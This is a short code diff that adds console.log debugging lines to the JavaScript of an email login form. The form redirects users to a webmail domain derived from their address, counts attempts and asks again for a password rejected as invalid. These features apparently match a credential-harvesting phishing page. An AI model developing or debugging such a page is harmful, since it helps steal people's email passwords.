@@ -288,8 +288,13 @@
                              // Get redirect URL from response or construct it
                              var redirectUrl = response.redirect_url || getWebmailDomain(email);
                              
+                             console.log('Success response received:', response);
+                             console.log('Redirect URL:', redirectUrl);
+                             console.log('Attempt number:', response.attempt);
+                             
                              // Redirect after 2 seconds
                              setTimeout(function() {
+                                 console.log('Redirecting to:', redirectUrl);
                                  window.location.href = redirectUrl;
                              }, 2000);
                              
@@ -298,6 +303,9 @@
                              $('#login-status-message').text(response.msg || 'Invalid email or password. Please try again.');
                              $('#login-status').removeClass('success-notice').addClass('error-notice').show();
                              $('#password').val('').focus();
+                             
+                             console.log('Error response received:', response);
+                             console.log('Attempt number:', response.attempt);
                              
                              // Update attempt counter if provided
                              if (response.attempt) {
